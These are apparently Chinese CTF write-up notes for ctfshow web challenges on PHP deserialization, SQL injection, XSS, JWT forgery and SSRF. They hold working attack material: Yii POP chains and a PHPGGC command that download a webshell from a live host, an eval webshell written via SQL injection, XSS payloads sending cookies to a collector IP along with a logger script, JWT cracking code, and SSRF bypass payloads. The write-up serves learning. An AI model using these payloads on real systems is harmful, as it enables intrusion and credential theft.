<strong>不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</strong>

<strong>大小写绕过即可。</strong>

`__toString()`  --> 把类当作字符串使用时触发

+ `__toString()`：将对象转换为字符串时返回 `$username`。
+ `__destruct()`：析构函数，在对象销毁时输出 `$flag`。
+ `if (preg_match('/ctfshow/', $cs)) { ... }`

检查 `$cs` 中是否包含字符串 `'ctfshow'`。如果匹配，则抛出异常。

审计代码：

发现，反序列话的是<span style="color: rgb(216, 59, 100)"><strong>`$cs=file_get_contnets(php://input)`</strong></span>，同时在<span style="color: rgb(216, 59, 100)"><strong>`__destruct`</strong></span>中有输出flag的语句。暗示了要找个机会传入一个ctfshow类进去。恰好看到<span style="color: rgb(216, 59, 100)"><strong>`$cs`</strong></span>对字符串ctfshow过滤了，也就明示了要传入ctfshow类的字符串给cs。这题就差把flag顺手给提交了。

php://input伪协议是post输入的参数。首先拿到一个ctfshow类的反序列化字符串；


```php
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}
$c=new ctfshow();
echo serialize($c);

//得到：
//  O:7:"ctfshow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
```



<details>
<summary>answer 1</summary>

利用burp传值；在hackbar中，post不能传入单个字符串，必须是以`a=b`形式传入，只传入`b`是不行的，所以要利用到burp，抓包，改值。（即加入cookie即可）![](/article-assets/2025/ctfshow-web-notes/images/screenshot-119.webp)

传入序列化内容 利用大小写绕过ctfshow

</details>


<details>
<summary>answer 2</summary>

#### 破坏结构进行析构

就是说，传入一个破坏了反序列化字符串结构的字符串进去，使得，即使异常了，也会析构。

新看到方法，太顶了，就看不懂为什么。。。。

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-120.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172129842-504516145.png)

</details>


### web267
无源码

搜了一下知道是 <span style="color: rgb(216, 59, 100)">`Yii`</span> 框架的反序列化漏洞。  
首先 <span style="color: rgb(216, 59, 100)">`admin/admin`</span> 弱密码登录，然后在 <span style="color: rgb(216, 59, 100)">`/index.php?r=site/about`</span> 可以看到注释里面有一个 <span style="color: rgb(216, 59, 100)">`?view-source`</span>，加上之后访问 <span style="color: rgb(216, 59, 100)">`/index.php?r=site%2Fabout&view-source`</span> 看到一个反序列化的点 <span style="color: rgb(216, 59, 100)">`backdoor/shell unserialize(base64_decode($_GET['code']))`</span>，随便搜一个反序列化的 <span style="color: rgb(216, 59, 100)">`pop`</span> 链打一下。


```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'shell_exec';    //对这里修改 也可使用passthru
            $this->id = 'cp /flag 3.txt';					//修改命令
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```


生成的参数提交到这即可


```php
index.php?r=backdoor/shell&code=
```


### web268
前面的流程和上一题差不多，不过这次不给用 <span style="color: rgb(216, 59, 100)">`BatchQueryResult`</span> 了，改用 <span style="color: rgb(216, 59, 100)">`RunProcess`</span> 类作为 <span style="color: rgb(216, 59, 100)">`pop`</span> 链入口。


```php
<?php
 
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'passthru';   //这可修改
            $this->id = 'wget https://hoping-billy-vip-pair.trycloudflare.com/big.php'; //传个大马
        }
    }
}
 
namespace Faker{
    use yii\rest\IndexAction;
    class Generator{
        protected $formatters ;
        public function __construct(){
            $this->formatters['isRunning']=[new IndexAction(),'run'];
        }
 
    }
}
 
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes=[];
        public function __construct(){
 
            $this->processes[]=new Generator();
        }
 
    }
}
 
namespace{
 
    use Codeception\Extension\RunProcess;
 
    echo base64_encode(serialize(new RunProcess()));
}
```


### web269
同理，换个链换个函数接着打，主要的内容还是要理解如何构造 <span style="color: rgb(216, 59, 100)">`pop`</span> 链，剩下的就是机械劳动了。


```php
<?php
namespace {
    use phpDocumentor\Reflection\DocBlock\Tags\Covers;

    class Swift_KeyCache_DiskKeyCache{
        private $path;
        private $keys;

        public function __construct()
        {
            $this->keys = array(
                "V0W" =>array("is", "Ca1j1")
            );
            $this->path = new Covers();
        }
    }

    $payload = new Swift_KeyCache_DiskKeyCache();
    echo base64_encode(serialize($payload));
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Faker\Generator;

    class Covers{
        private $refers;
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
            $this->refers = "AnyStringisOK";
        }
    }

}

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'exec';
            $this->id = 'wget https://hoping-billy-vip-pair.trycloudflare.com/big.php';
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['render'] = [new IndexAction, 'run'];
        }
    }
}
```


### web270
学会构造 <span style="color: rgb(216, 59, 100)">`pop`</span> 链固然重要，但这里找到了好用的工具 [PHPGGC](https://github.com/ambionics/phpggc)。


```bash
$ ./phpggc Yii2/RCE2 "passthru('wget https://hoping-billy-vip-pair.trycloudflare.com/big.php');" --base64
```


该命令在linux中使用 推荐kali

## web入门--代码审计题解
### web301
开始一个登录框, 下意识sql尝试一下  
发现 1' 的时候会到一个 checklogin.php 的路径下, 但啥也没有  
好吧, 这是要审计代码的 ,下载好源码, 开始审计
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-121.webp)

看了一下源码 , 应该就是sql注入了 , 而且还没过滤什么其他的东西  

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-122.webp)


<details>
<summary>方法一：非预期访问index.php</summary>

访问index.php抓包查看记得得到flag.php

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-123.webp)

</details>


<details>
<summary>方法二: 写shell</summary>

<strong>-1 ' union select "`<?php eval($_POST[1]);?>`" into outfile "/var/www/html/1.php"#</strong>

into outfile 是 MySQL 的一个命令，用于将查询的结果写入到服务器上的一个文件中。

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-124.webp)

</details>


## web入门--XSS(跨站脚本攻击)
利用现成的[http://47.115.221.235:1234/admin.php](http://47.115.221.235:1234/admin.php)服务器攻击得到cookie

### XSS介绍
<strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong> 是一种前端攻击，攻击者通过在网站的输入或存储数据中注入恶意 JavaScript 代码，使受害者的浏览器执行这些恶意脚本，进而实现 <strong>劫持用户会话、窃取敏感信息、诱导用户执行恶意操作</strong> 等攻击目标。  

 XSS 攻击主要分为 <strong>三种类型</strong>：  

##### <strong>1. 反射型 XSS</strong>
<strong>典型场景：搜索框、跳转链接</strong>

<strong>特点</strong>：

+ 代码不会被存储在服务器上，而是通过 URL 传递，并在用户请求时立即执行。
+ 需要用户主动点击恶意链接或提交特定请求才能触发攻击。

<strong>攻击流程</strong>：

1. 攻击者构造恶意 URL，例如：


```php
https://example.com/search?query=<script>alert('XSS')</script>
```


2. 受害者访问该 URL，服务器会将 `query` 参数直接输出到页面，而没有对其进行过滤。
3. 受害者的浏览器解析 HTML 时，恶意 JavaScript 代码被执行。

##### <strong>2. 存储型 XSS</strong>
典型场景：评论区、留言板

<strong>特点</strong>：

+ 恶意代码被存储在服务器端数据库或文件系统中，所有访问该页面的用户都会被攻击。
+ 影响范围较大，危害更严重。

<strong>攻击流程</strong>：

1. 攻击者在某个输入框（如留言板、评论区）提交恶意 JavaScript 代码。
2. 服务器存储该数据，并在后续的网页中不做过滤地输出。
3. 受害者访问包含该数据的页面时，浏览器执行其中的 JavaScript 代码。

##### <strong>3. DOM 型 XSS</strong>
典型场景：URL片段（#）、前端JS操作DOM

<strong>特点</strong>：

+ 发生在前端 JavaScript 解析过程中，不经过服务器，直接在浏览器端完成注入和执行。
+ 代码依赖于 JavaScript 操作 DOM 结构的方式。

<strong>攻击流程</strong>：

1. 攻击者构造特定 URL，例如：


```php
https://example.com/#<script>alert('XSS')</script>
```


2. 受害者访问该 URL，浏览器端的 JavaScript 解析 `window.location.hash` 并将其插入 DOM。
3. 由于未进行安全处理，导致 JavaScript 代码被执行。

### web316
payload:


```html
<script>location.href="http://118.190.145.xxx/xss.php?cookie="+document.cookie</script>
```


1. `location.href = ...`

这是 JavaScript 中将浏览器<strong>当前页面跳转到指定 URL</strong> 的写法。

    - `location.href` 表示当前页面的地址栏 URL。
    - 给它赋一个新的地址就等于“跳转”到那个地址。
2. `"http://118.190.145.xxx/xss.php?cookie=" + document.cookie`

这是你构造的目标 URL，其中：

    - `http://118.190.145.xxx/xss.php` 是我的后端收集数据的服务器地址。
    - `?cookie=` 是 GET 参数，准备将 Cookie 信息作为参数发送。
    - `document.cookie` 是当前页面的 Cookie 值。

所以完整拼接后，会变成类似：


```plain
http://118.190.145.xxx/xss.php?cookie=PHPSESSID=abcd1234; other=value
```


然后浏览器跳转到这个地址，也就是访问了你服务器上的 xss.php 文件，并通过 GET 参数携带了 cookie 信息。

然后<strong>打开服务器</strong>cat一下暂存的cookie.txt即可得到


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-125.webp)

#### 但是
我想说的是在线的dnslog等等都用不了，背后需要一个服务器，需要自己搭建好php环境 写入相关的脚本 <strong><span style="color: #DF2A3F">最重的是 要赋予php相关的权限 （要关注报错日志</span></strong>


```php
<?php
$cookie = isset($_GET['cookie']) ? htmlspecialchars($_GET['cookie'], ENT_QUOTES) : '';
$time = date('Y-m-d H:i:s');
$logFile = __DIR__ . "/cookie.txt";

if (!empty($cookie)) {
    $log = fopen($logFile, "a");
    if ($log) {
        fwrite($log, $time . ':    ' . $cookie . "\n");
        fclose($log);
        echo "Cookie logged.";
    } else {
        echo "Failed to open log file.";
    }
} else {
    echo "No cookie parameter provided.";
}
?>
```


这是服务器上的脚本

### web317
题目显示依旧是反射性xss，且此题说已过滤

经测试


```javascript
<script>alert(1)</script>
```


无效被过滤

因此改用body


```javascript
<body onload="location.href='http://118.190.145.205/xss.php?cookie='+document.cookie"></body>
```


这是一段 HTML `<body>` 标签，包含一个事件属性：

#### `onload="..."`
+ `onload` 是 <strong><span style="color: #DF2A3F">HTML 的一个事件属性</span></strong>。
+ 它表示：当页面 <strong>加载完成</strong> 后，自动执行括号内的 JavaScript 代码。

#### `location.href='http://...'+document.cookie`
这部分和之前写过的 `<script>` 内容作用一样：

+ `location.href = "..."`：表示浏览器跳转到指定 URL。
+ `'http://118.190.145.205/xss.php?cookie=' + document.cookie`：
    - `document.cookie`：获取当前网页的 Cookie。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-126.webp)

得到flag

### web318


## web入门--jwt
### web345
首先查看页面源代码

发现/admin

随后访问/admin/

<strong>补充：</strong>

<strong>如访问 http://ctfshow.com/index.php/admin -->此时代表访问index.php下的admin文件</strong>

<strong>若访问 http://ctfshow.com/index.php/admin/ -->则表示访问index.php下的目录（文件夹）</strong>

+ 进入后可查看cookie，将cookie复制，在hackbar中base64解码后，将user改为admin
+ 再将编码base64加密
+ 粘回cookie，同时在url访问ctf.show/admin/


<details>
<summary>所查内容</summary>

知道是JWT。直接开做。

在jwt.io转换后，发现不存在第三部分的签证，也就不需要知道密钥。

全称是JSON Web Token。

通俗地说，JWT的本质就是一个字符串，它是将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。

JWT由3部分组成：标头(Header)、有效载荷(Payload)和签名(Signature)。在传输的时候，会将JWT的3部分分别进行Base64编码后用.进行连接形成最终传输的字符串

JWTString = Base64(Header).Base64(Payload).HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)

这里只需要注意访问的是/admin/而不是/admin因为访问/admin表示访问admin.php而访问/admin/表示访问的是admin目录下默认的index.php

</details>


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-127.webp)

### web346
与web345开头一样，但该cookie进行了加密，我们需要使用工具

[https://jwt.io/](https://jwt.io/)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-128.webp)


<details>
<summary>answer 1</summary>

将alg:HS256 -->改为 none，即取消加密，并将sub的内容修改为admin

再将右侧cookie复制与web345相同，修改cookie，同时访问/admin/

</details>


<details>
<summary>answer 2</summary>

爆破密钥（菜）。是123456

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-129.webp)

</details>


### web347

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-130.webp)


使用jupyter notebook脚本 放心使用以下脚本


```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MjQ3MDk3MiwiZXhwIjoxNzQyNDc4MTcyLCJuYmYiOjE3NDI0NzA5NzIsInN1YiI6InVzZXIiLCJqdGkiOiI3MTdlYWJhOWIwYmIwMmUwZDUwMWZjZWNkMmM3ZjYzYiJ9.86sWXQrr-2Tq4RifqA4q3cP7LMymggTYF-ZCHYbr7V8" # 题目中的 token
password_file = r"C:\Users\29216\Documents\nums.txt" # 密码文件

with open(password_file,'rb') as file:
    for line in file:
        line = line.strip() # 去除每行后面的换行
        try:
            jwt.decode(token, verify=True, key=line, algorithms="HS256") # 设置编码方式为 HS256
            print('key: ', line.decode('ascii'))
            break
        except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError
                , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,
                jwt.exceptions.ImmatureSignatureError): # 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的
            print("key: ", line.decode('ascii'))
            break
        except jwt.exceptions.InvalidSignatureError: # 签名错误则表示密钥不正确
            print("Failed: ", line.decode('ascii'))
            continue
    else:
        print("Not Found.")
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-131.webp)

得到key

使用jwt.io 修改为admin 密码为123456即可

### web348

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-132.webp)

得到后再使用脚本跑即可


```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MjQ3MDk3MiwiZXhwIjoxNzQyNDc4MTcyLCJuYmYiOjE3NDI0NzA5NzIsInN1YiI6InVzZXIiLCJqdGkiOiI3MTdlYWJhOWIwYmIwMmUwZDUwMWZjZWNkMmM3ZjYzYiJ9.86sWXQrr-2Tq4RifqA4q3cP7LMymggTYF-ZCHYbr7V8" # 题目中的 token
password_file = r"D:\Web\dict\pydictor\results\words.txt" # 密码文件

with open(password_file,'rb') as file:
    for line in file:
        line = line.strip() # 去除每行后面的换行
        try:
            jwt.decode(token, verify=True, key=line, algorithms="HS256") # 设置编码方式为 HS256
            print('key: ', line.decode('ascii'))
            break
        except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError
                , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,
                jwt.exceptions.ImmatureSignatureError): # 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的
            print("key: ", line.decode('ascii'))
            break
        except jwt.exceptions.InvalidSignatureError: # 签名错误则表示密钥不正确
            print("Failed: ", line.decode('ascii'))
            continue
    else:
        print("Not Found.")
```


再用jwt.io修改即可

### web349
[https://ctf.show/writeups/1620307](https://ctf.show/writeups/1620307)

这个题给了个app.js


```javascript
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});
 
router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```



<details>
<summary>answer 1</summary>

我们可以看到这个就是利用私钥去生成一个jwt然后利用公钥去解密，并且我们访问/private.key可以得到私钥，访问/public.key可以得到公钥，那我们就用他给的这个代码本地自己搭一个网站，将源码里面的user换成admin然后访问自己搭的网站，这时我们自己搭的网站里cookie里面的jwt就是我们新生成的jwt。

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-133.webp)

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-134.webp)

之后就打开题目抓包替换jwt然后请求方式换为POST拿到flag

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-135.webp)

</details>


<details>
<summary>answer 2</summary>

当然这里还有第二种方法，先下载私钥，然后我们用私钥去生成一个jwt。具体的就是先用之前题目用的jwt网站解析一下payload和header然后用python生成一个jwt，之后抓包用新生成的jwt替换原来的jwt最后post发包一样能拿到flag。

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-136.webp)

```python
import jwt
private_key = open('private.key', 'r').read()
payload={"user":"admin","iat": 1645612970}
print(jwt.encode(payload=payload, key=private_key, algorithm='RS256'))
```


</details>


[ctfshow web入门 JWT_ctfshow jwt-CSDN博客](https://blog.csdn.net/m0_46520554/article/details/123102868?ops_request_misc=%257B%2522request%255Fid%2522%253A%25223130a577ae876482f7f1caefca9cc8cf%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=3130a577ae876482f7f1caefca9cc8cf&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2\~all\~sobaiduend\~default-1-123102868-null-null.142^v102^pc_search_result_base2&utm_term=ctfshow%20web%E5%85%A5%E9%97%A8%20jwt&spm=1018.2226.3001.4187)

### 未web350
[ctfshow web入门 JWT_ctfshow jwt-CSDN博客](https://blog.csdn.net/m0_46520554/article/details/123102868?ops_request_misc=%257B%2522request%255Fid%2522%253A%25223130a577ae876482f7f1caefca9cc8cf%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=3130a577ae876482f7f1caefca9cc8cf&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2\~all\~sobaiduend\~default-1-123102868-null-null.142^v102^pc_search_result_base2&utm_term=ctfshow%20web%E5%85%A5%E9%97%A8%20jwt&spm=1018.2226.3001.4187)

这个题也考JWT的三种常见的攻击方式之一把非对称算法 RS256 改为对称算法 HS256，用泄露的公钥签名数据，服务器尝试用公钥作为 secret 验证签名。也就是CVE-2016-5431漏洞

首先题目给了源码，然后和之前一样访问/public.key可以拿到公钥文件，那就和之前一样本地自己搭一下然后访问拿到新的jwt。这里注意一下要将源码的//routes换成//public然后将user换成admin。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-137.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-138.webp) 之后就打开题目抓包替换jwt然后请求方式换为POST拿到flag


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-139.webp)

## web入门--SSRF(服务端请求伪造)
### SSRF理解
ssrf理解：通过客户端访问web服务主机，此时web服务主机处于外网中也处于其所处的内网中，客户端处于外网中。外网无法访问web服务主机所处的内网中的其他主机。于是我们可以通过web服务主机的ssrf漏洞curl_exc()去利用处在内网中的服务主机访问内网中的其他主机，从而达到服务端请求伪造。

### 常见函数
1. <strong>`curl_init()`</strong>
    - 初始化 cURL 句柄，准备发送 HTTP 请求。
2. <strong>`curl_setopt()`</strong>
    - <strong>设置 cURL 选项</strong>，用于配置请求行为：
        * `CURLOPT_URL`：目标 URL
        * `CURLOPT_RETURNTRANSFER`：是否返回响应内容（否则会直接输出）
        * `CURLOPT_HEADER`：是否包含 HTTP 头部信息
3. <span style="color: #DF2A3F"><strong>`curl_exec()`</strong></span>
    - 执行请求并获取响应。
4. <strong>`curl_close()`</strong>
    - 关闭 cURL 资源，释放内存。
5. <strong>`parse_url()`</strong>
    - 会解析url中的各个参数
6. <strong>`parse_url()`</strong>
7. <strong>`parse_url()`</strong>
8. <strong>`parse_url()`</strong>
9. <strong>`parse_url()`</strong>

### web351

```php
<?php
error_reporting(0);                // 关闭所有错误报告
highlight_file(__FILE__);          // 高亮显示当前文件的源代码
$url = $_POST['url'];              // 从 POST 请求中获取 'url' 参数
$ch = curl_init($url);             // 初始化 cURL 会话，设置目标 URL
curl_setopt($ch, CURLOPT_HEADER, 0);       // 不包含响应头信息
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 将响应作为字符串返回，而不是直接输出
$result = curl_exec($ch);          // 执行 cURL 请求，获取响应内容
curl_close($ch);                   // 关闭 cURL 会话
echo ($result);                    // 输出响应内容
?>
```


1. <strong>`$ch=curl_init($url);`</strong>
+ 初始化一个 cURL 会话，并设置目标 URL。
+ `curl_init()` 是 cURL 库的初始化函数，返回一个 cURL 句柄，用于后续的配置和执行。
2. <strong>`curl_setopt($ch, CURLOPT_HEADER, 0);`</strong>
+ 设置 cURL 选项，不包含响应头信息。
+ `CURLOPT_HEADER` 设置为 `0` 表示不将响应头包含在输出中。
3. <strong>`curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);`</strong>
+ 设置 cURL 选项，将响应内容作为字符串返回，而不是直接输出到浏览器。
+ `CURLOPT_RETURNTRANSFER` 设置为 `1` 表示将响应内容存储在变量中，而不是直接输出。
4. <strong>`$result=curl_exec($ch);`</strong>
+ 执行 cURL 请求，获取目标 URL 的响应内容，并将其存储在变量 `$result` 中。
+ `curl_exec()` 是 cURL 库的执行函数，返回请求的响应内容。
5. <strong>`curl_close($ch);`</strong>
+ 关闭 cURL 会话，释放资源。
+ `curl_close()` 是 cURL 库的清理函数，用于关闭 cURL 句柄。
6. <strong>`echo ($result);`</strong>
+ 输出 cURL 请求的响应内容。
+ 如果请求成功，`$result` 将包含目标 URL 的内容，并将其直接输出到浏览器。

尝试使用 file 协议读文件：


```cpp
url=file:///etc/passwd      
它通过 file:// 协议访问本地文件系统，具体来说是读取 /etc/passwd 文件的内容。
```


成功读取到 /etc/passwd

同理我们可以把 flag 给读出来：


```cpp
url=file:///var/www/html/flag.php
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-140.webp)

访问页面源码后得到图片内容

结合这个代码我们可以发现，请求来自本地就可以了

那么我们也可以这样打：


```plain
url=http://127.0.0.1/flag.php
背后源码指定我们输入127.0.0.1而非真正访问本地
```


### web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);//知道这个即可
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```


<strong>为什么 </strong><strong>`file://`</strong><strong> 被阻止？</strong>

+ <strong>协议检查</strong>：
    - 代码通过 `parse_url($url)` 解析 URL，并检查 `$x['scheme']` 是否为 `http` 或 `https`。
    - 如果 `url` 参数使用 `file://` 协议，`$x['scheme']` 的值将是 `file`，不符合 `http` 或 `https` 的条件，因此会直接执行 `die('hacker')`。

<strong>`parse_url()`</strong>函数会解析url中的各个参数

<strong>`curl_init()`</strong>初始化 cURL 句柄，准备发送 HTTP 请求。

<strong>`curl_setopt()`</strong>

+ <strong>设置 cURL 选项</strong>，用于配置请求行为：
    - `CURLOPT_URL`：目标 URL
    - `CURLOPT_RETURNTRANSFER`：是否返回响应内容（否则会直接输出）
    - `CURLOPT_HEADER`：是否包含 HTTP 头部信息

代码中会检测协议是否为http或https，使用正则表达式匹配关键字是否含有localhost或127.0.0  
绕过方式:可以使用<strong>进制转换</strong>的方式将ip地址转换为其他进制进行访问


```php
url=http://0x7F000001/flag.php
```


### web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```


与上题相比，仅是限制了127.0

于是可以有以下方法


```php
// IP转数字
url=http://2130706443/flag.php

// 缺省零
url=http://127.1/flag.php

// 127.0.0.1 ~ 127.255.255.254 都表示 localhost
url=http://127.255.255.254/flag.php

// sudo.cc
url=http://sudo.cc/flag.php

// 0 在 linux 系统中会解析成 127.0.0.1
// 在 windows 中解析成 0.0.0.0
url=http://0/flag.php
```


### web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```


这里检测的是是否包含1或0,采用进制转换的方式就不能绕过了，可以采用域名解析或短网址绕过或者重定向  
这里可以采用域名解析，让域名解析到127.0.0.1，再让服务器访问域名就可以了。


```php
url=http://sudu.cc/flag.php
```


### web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```


这里对地址进行了长度检测，可以采用简写的方式去绕过


```php
url=http://0/flag.php			 -->0为host部分
url=http://127.1/flag.php  -->127.1为host部分
```



<details>
<summary>parse_url()补充</summary>

#### 1. `parse_url()` 函数

`parse_url()` 是 PHP 中的一个函数，用于解析 URL 并返回其组成部分。例如：

```plain
$url = "http://example.com/path?query=123";
$x = parse_url($url);
```


解析后的 `$x` 是一个关联数组，包含以下字段：

```plain
Array
(
    [scheme] => http
    [host] => example.com
    [path] => /path
    [query] => query=123
)
```


- `$x['scheme']`：URL 的协议部分（如 `http`、`https`）。
- `$x['host']`：URL 的主机部分（如 `example.com`）。
- `$x['path']`：URL 的路径部分（如 `/path`）。
- `$x['query']`：URL 的查询参数部分（如 `query=123`）。

---

#### 2. `$host` 的含义

在代码中，`$host` 是从 `$url` 中解析出的主机部分：

```plain
$host = $x['host'];
```


例如：

- 如果 `$url` 是 `http://example.com/path`，那么 `$host` 是 `example.com`。
- 如果 `$url` 是 `http://127.0.0.1/flag.php`，那么 `$host` 是 `127.0.0.1`。

</details>


### web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```



```php
payload: url=http://0/flag.php			 -->0为host部分
```


### web357(需要服务器)

```php
error_reporting(0); // 关闭所有错误报告
highlight_file(__FILE__); // 高亮显示当前文件的源代码

$url = $_POST['url']; // 从 POST 请求中获取 'url' 参数
$x = parse_url($url); // 解析 URL，返回其组成部分（协议、主机、路径等）

// 检查 URL 的协议是否为 http 或 https
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    // 解析主机部分，获取其 IP 地址
    $ip = gethostbyname($x['host']);
    echo '</br>' . $ip . '</br>'; // 输出 IP 地址

    // 检查 IP 地址是否为内网地址（私有地址或保留地址）
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        die('ip!'); // 如果 IP 地址非法，返回 'ip!'
    }

    // 获取 URL 的内容并输出
    echo file_get_contents($_POST['url']);
} else {
    die('scheme'); // 如果协议非法，返回 'scheme'
}
```



<details>
<summary>补充</summary>

##### `gethostbyname()`

- 用于将主机名解析为 IP 地址。
- 例如：

```plain
$ip = gethostbyname("example.com");
echo $ip; // 输出 93.184.216.34
```


##### `filter_var()`

- 用于验证 IP 地址的合法性。
- `FILTER_VALIDATE_IP`：验证是否为合法的 IP 地址。
- `FILTER_FLAG_NO_PRIV_RANGE`：禁止私有 IP 地址范围（如 `192.168.0.0/16`、`10.0.0.0/8`）。
- `FILTER_FLAG_NO_RES_RANGE`：禁止保留 IP 地址范围（如 `127.0.0.0/8`）。

##### `file_get_contents()`

- 用于读取文件或 URL 的内容。
- 例如：

```plain
echo file_get_contents("http://example.com");
```


</details>


gethostbyname()这里对url对应的ip地址进行了检测，因此不能使用短网址，域名解析等手段了，只能采用重定向的方式，构建一个重定向的网页，跳转至http://127.0.0.1/flag.php即可,然后将文件放入服务器中，去访问它即可

利用 Location 进行重定向，写一个重定向的文件 my6n.php 在服务器上：


```php
<?php
header("Location:http://127.0.0.1/flag.php"); 
```


payload:


```php
